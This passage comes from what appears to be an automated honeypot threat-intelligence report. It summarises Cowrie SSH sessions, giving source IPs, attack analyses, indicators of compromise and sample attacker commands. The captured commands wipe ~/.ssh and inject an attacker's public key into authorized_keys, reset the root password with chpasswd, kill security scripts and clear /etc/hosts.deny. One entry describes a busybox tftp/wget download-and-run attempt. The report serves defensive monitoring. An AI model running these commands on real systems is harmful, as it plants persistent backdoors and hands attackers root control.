- `chattr -ia` / `lockr -ia` to lock the `.ssh` directory (preventing modifications)
- Removal of existing `.ssh`, creation of a new one, injection of a malicious SSH public key into `authorized_keys`
- Disabling group read/write permissions (`chmod -R go= ~/.ssh`)
- System‑info commands: `cat /proc/cpuinfo`, `free -m`, `uname`, `whoami`, `lscpu`, `df -h`, `crontab -l`, `top`, etc.

**Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.226.118**  
- SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1\n0kfg2nUsfa5A\n0kfg2nUsfa5A"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1\n0kfg2nUsfa5A\n0kfg2nUsfa5A\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 19b6796b9085...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 124.226.212.169

#### Analysis

**Attack Type:** Backdoor installation / Remote access  
**Objective:** Establish a persistent remote shell on the target to allow further exploitation or botnet recruitment.  

**Techniques Used:**
- SSH key injection into `~/.ssh/authorized_keys` (public‑key authentication).  
- Root password change via `chpasswd`.  
- Process hiding by killing honeypot scripts (`secure.sh`, `auth.sh`) and disabling sleep.  
- Modification of `/etc/hosts.deny` to block detection or legitimate traffic.

**Indicators of Compromise (IOCs):**
- Public SSH key: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ezzBb3r1ZQ23"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
```

---

### Pattern: ba8b3a7aac8f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.163.189

#### Analysis

**Attack Type:** Backdoor installation / privilege‑elevation  
**Objective:** Gain persistent remote access by creating an SSH key for the root user and changing the root password, then remove any security scripts that might block this.  

**Techniques & Tools:**
- `chattr`, `lockr` to lock files  
- `chmod -R go= ~/.ssh` to restrict permissions  
- `echo … > .ssh/authorized_keys` to inject an SSH public key  
- `chpasswd` to set root password (`root:uOV8A5RQyHTY`)  
- `pkill -9` to terminate potential security processes (`secure.sh`, `auth.sh`, `sleep`)  
- `echo > /etc/hosts.deny` to block host access  

**Indicators of Compromise (IOCs):**
- Attacker IP: **101.47.163.189** (Singapore)  
- SSH public key string: *ssh‑rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr*  
- File names: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`  

**Threat Level:** **High** – the attacker successfully creates a privileged backdoor and attempts to remove security mechanisms.  

**Brief Summary:** The attacker from Singapore injected an SSH key for root, changed the root password, and removed potential security scripts to establish persistent remote access on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:uOV8A5RQyHTY"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: d680473c5364...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 150.5.169.138

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection (likely botnet recruitment or future exploitation).

**Objective:**  
Gain persistent remote access to the honeypot by adding a malicious public‑key to `authorized_keys` and collecting system information for profiling.

**Techniques & Tools Used:**
- **SSH key injection** (`echo ... > .ssh/authorized_keys` with chmod).
- **Permission manipulation** (`chmod -R go= ~/.ssh`).
- System reconnaissance commands (CPU info, memory usage, uptime, `uname`, `whoami`, `lscpu`, `df`, etc.).

**Indicators of Compromise (IOCs):**
- Attacker IP: 150.5.169.138
- Public key string in the authorized_keys file:  
`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`
- File path: `~/.ssh/authorized_keys`

**Threat Level:** Medium – the attacker establishes a backdoor but does not immediately exploit it; however, the presence of an SSH key indicates potential future attacks.

**Brief Summary:**  
The attacker injected a malicious SSH public‑key into the honeypot’s authorized_keys file to enable remote access and performed system reconnaissance to profile the target.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1\nltrMIcHKyRzk\nltrMIcHKyRzk"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1\nltrMIcHKyRzk\nltrMIcHKyRzk\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: d2f3e9c8868f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 218.37.207.187

#### Analysis

**Attack Type:** Backdoor installation / bot‑network recruitment  
**Objective:** Gain persistent remote access by adding an SSH key to the honeypot’s `authorized_keys` and setting a new root password.  

**Techniques & Tools:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys` with a hard‑coded RSA public key.
- **Permission Manipulation** – `chmod -R go= ~/.ssh`, `chattr -ia .ssh`.
- **Root Password Reset** – `echo "root:OtHkuJatNuOZ"|chpasswd|bash`.
- **Process Termination** – `pkill -9 secure.sh; pkill -9 auth.sh; pkill -9 sleep`.
- **System Reconnaissance** – various `/proc/cpuinfo`, `free`, `ls`, `uname`, `top`, `df` commands.

**Indicators of Compromise (IOCs):**
- Attacker IP: 218.37.207.187  
- Public SSH key string in `authorized_keys`:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- Root password set to `OtHkuJatNuOZ`.

**Threat Level:** **High** – attacker achieved root-level access and installed a persistent backdoor.

**Brief Summary:** The attacker injected an SSH key into the honeypot, reset the root password, and performed system reconnaissance, effectively establishing a remote backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:OtHkuJatNuOZ"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: f666fcb85736...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.222.225

#### Analysis

**1. Attack Type:**  
Reconnaissance – the attacker is collecting system information for future exploitation or profiling.

**2. Objective:**  
Gather detailed hardware, OS, and user data (CPU model, memory usage, filesystem layout, cron jobs, current users) to understand the target environment.

**3. Techniques:**  
- Use of standard shell utilities (`cat`, `grep`, `awk`, `free`, `uname`, `whoami`, `lscpu`, `df`) to extract system metrics.
- Attempted attribute modification on `.ssh` directory (`chattr -ia .ssh; lockr -ia .ssh`) – likely a test for permission changes or hidden file manipulation.

**4. Indicators of Compromise (IOCs):**  
None detected in this session – no URLs, IPs, payload downloads, or suspicious filenames.

**5. Threat Level:**  
Low – the attacker only performed passive information gathering without any active exploitation or malicious payload.

**6. Brief Summary:**  
The attacker executed a series of shell commands on the Cowrie honeypot to collect system and user details, likely for future reconnaissance or profiling purposes.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cat /proc/cpuinfo | grep name | wc -l
echo "root:aEv55700t6HS"|chpasswd|bash
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
crontab -l
w
... (+8 more)
```

---

### Pattern: ccb388a2973d...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.161.212

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access by adding a malicious SSH key and resetting the root password.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`) to make it immutable, then creation of new `.ssh` with an injected RSA public key.  
- Setting root password via `chpasswd`.  
- Attempting to kill or hide processes (`pkill -9 secure.sh`, `pkill -9 auth.sh`, `pkill -9 sleep`).  
- System reconnaissance (CPU info, memory usage, filesystem details).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.161.212**  
- RSA public key string in `/ssh/authorized_keys` (long base‑64 string).  
- Commands targeting `/etc/hosts.deny`.  

**Threat Level:** **High** – the attacker has established a persistent backdoor and altered privileged credentials, posing significant risk to system integrity.

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory, reset the root password, attempted to hide processes, and collected system information, effectively creating a backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:cgCk1ocNlUbv"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: c18afef2f9fd...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.222.225

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain remote shell access via an injected SSH key while collecting system information.  

**Techniques & Tools:**  
- `chattr -ia` / `lockr -ia` – likely custom commands to lock files.  
- Creation of `.ssh/authorized_keys` and setting restrictive permissions (`chmod -R go= ~/.ssh`).  
- Piping `echo` into `passwd` to attempt password changes (likely a brute‑force or credential reset).  
- System information queries: `/proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, `whoami`, `lscpu`, `df`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.222.225** (Singapore).  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"**.  
- File path: `~/.ssh/authorized_keys`.  

**Threat Level:** **High** – the attacker successfully installed a backdoor and attempted to alter credentials, enabling persistent remote access.

**Brief Summary:** The session shows an attacker injecting an SSH key into the honeypot’s `.ssh` directory, attempting password changes, and gathering system details for reconnaissance. This indicates a high‑risk backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nbQJyXCmxdGF8\nbQJyXCmxdGF8"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nbQJyXCmxdGF8\nbQJyXCmxdGF8\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 5baa8d6d0f0e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 218.37.207.187

#### Analysis

**Attack Type:** Backdoor installation / remote access

**Objective:** Install an SSH key and set a new root password to enable persistent remote control of the host.

**Techniques:**
- Manipulation of `~/.ssh` directory (chmod, chattr, lockr)  
- Injection of a public‑key into `authorized_keys`  
- Password change via `chpasswd`  
- Process termination (`pkill -9`) to hide activity  
- System reconnaissance commands (cpuinfo, memory, uname, etc.)

**Indicators of Compromise (IOCs):**
- Attacker IP: **218.37.207.187**  
- SSH public key string in authorized_keys: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `iQA9uVmTlsPE`

**Threat Level:** **High** – the attacker gained root access and installed a persistent backdoor.

**Brief Summary:** The attacker injected an SSH key, changed the root password, and performed system reconnaissance to establish a remote backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:iQA9uVmTlsPE"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: fe995e066fe8...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.226.118

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain unrestricted SSH access and root privileges on the target system.  

**Techniques Used:**  
- **SSH Key Injection:** Created a new `.ssh/authorized_keys` file with a hard‑coded RSA key.  
- **Root Password Change:** Executed `chpasswd` to set a known root password (`root:tFekhRY7Ej0J`).  
- **Process Termination & Host Deny:** Killed suspicious processes and added an entry to `/etc/hosts.deny`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: `45.78.226.118`  
- Hard‑coded SSH key: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `root:tFekhRY7Ej0J`  

**Threat Level:** **High** – the attacker achieved full system control with a persistent backdoor.  

**Brief Summary:** The attacker injected an SSH key and changed the root password, establishing a permanent backdoor for unrestricted access to the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:tFekhRY7Ej0J"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 1f7e4d35a804...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.142.188

#### Analysis

**Attack Type:** Backdoor / Bot‑Recruitment  
**Objective:** Gain remote SSH access and potentially control the host (via a malicious key) while gathering system information for profiling.  
**Techniques:**  
- **SSH Key Injection** – creation of `.ssh/authorized_keys` with an unusual public key (`mdrfckr`).  
- **Password Manipulation** – attempts to set a weak password (“Huawei@123”) using `passwd`.  
- **System Reconnaissance** – CPU, memory, architecture, disk usage queries.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 101.47.142.188  
- Public key string: “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr”  
- File path: `~/.ssh/authorized_keys`  

**Threat Level:** **High** – the attacker is installing a persistent backdoor and attempting to compromise user credentials.  

**Brief Summary:** The session shows an attacker injecting a malicious SSH key, attempting password changes, and collecting system data—indicative of a botnet recruitment or remote control setup.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "Huawei@123\ndA3iEcHcKwaE\ndA3iEcHcKwaE"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "Huawei@123\ndA3iEcHcKwaE\ndA3iEcHcKwaE\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 1af95735a6b1...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.161.212

#### Analysis

**Attack Type:** Backdoor installation (botnet recruitment)

**Objective:** Gain persistent SSH access to the host by inserting a malicious RSA key into `authorized_keys` and resetting the root password, while collecting system information for profiling.

**Techniques & Tools:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`, `chmod`)  
- Injection of an RSA public key into `authorized_keys`  
- Password reset via `chpasswd` (root password set to “OqLEATN3ucJ3”)  
- Process termination (`pkill -9`) and host denial modification (`echo > /etc/hosts.deny`)  
- System reconnaissance commands (`cat /proc/cpuinfo`, `free`, `ls`, `uname`, `top`, `df`)

**Indicators of Compromise (IOCs):**
- Attacker IP: **101.47.161.212**  
- RSA key string in `/ssh/authorized_keys`: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: **OqLEATN3ucJ3**  
- File names: `.ssh/authorized_keys`, `/etc/hosts.deny`

**Threat Level:** High – the attacker establishes a persistent SSH backdoor with root privileges, enabling full control over the system.

**Brief Summary:** The attacker injected a malicious RSA key into the host’s `authorized_keys` and reset the root password to gain permanent SSH access, while gathering system details for profiling.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:OqLEATN3ucJ3"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 12d51876c6b5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.163.189

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Establish persistent SSH access (via injected RSA key) and modify root credentials for future exploitation.  

**Techniques:**  
- `chattr -ia` & `lockr` to make `.ssh` immutable/locked.  
- Creation of a new SSH key in `authorized_keys`.  
- `chmod -R go= ~/.ssh` to restrict group write permissions.  
- `chpasswd` to set root password (`root:KHQm78QlURsG`).  
- System‑info gathering (CPU, memory, OS, user).  

**Indicators of Compromise (IOCs):**  
- RSA key string in `.ssh/authorized_keys`:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hG

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:KHQm78QlURsG"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 2ae217fd7ce7...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 49.91.232.42

#### Analysis

**1. Attack Type:**  
- **Backdoor / Botnet Recruitment** – the attacker is attempting to install a lightweight stealthy script that could be used for remote control or to join a botnet.

**2. Objective:**  
- Download a small payload (likely a backdoor or botnet agent) via `tftp`/`wget`, execute it in `/dev/shm`, and then clean up the temporary file.

**3. Techniques & Tools Used:**
- **Busybox (`/bin/busybox`)** – used as a fallback shell for minimal functionality.
- **TFTP / WGET** – for downloading remote payloads.
- **`dd bs=52 count=1 if=.s`** – to read the downloaded file in chunks.
- **Temporary storage in `/dev/shm/.s`** – volatile memory to avoid persistence.
- **Self‑cleanup (`rm .s; exit`)** – removes evidence after execution.

**4. Indicators of Compromise (IOCs):**
- File name: `.s` in `/dev/shm`.
- Commands: `tftp`, `wget`, `busybox`, `dd bs=52 count=1 if=.s`.
- Marker string: `"NYLVN"` appearing multiple times.
- Attacker IP: 49.91.232.42 (China).

**5. Threat Level:**  
- **Medium** – quick, low‑impact attempt to install a backdoor; no evidence of successful execution or persistence.

**6. Brief Summary:**  
The attacker from China attempted to download and execute a small backdoor script via `tftp`/`wget`, using Busybox in `/dev/shm` and then removed the temporary file, indicating a stealthy botnet recruitment effort.

#### Sample Commands
```
enable
system
system
shell
shell
sh
cat /proc/mounts; /bin/busybox NYLVN
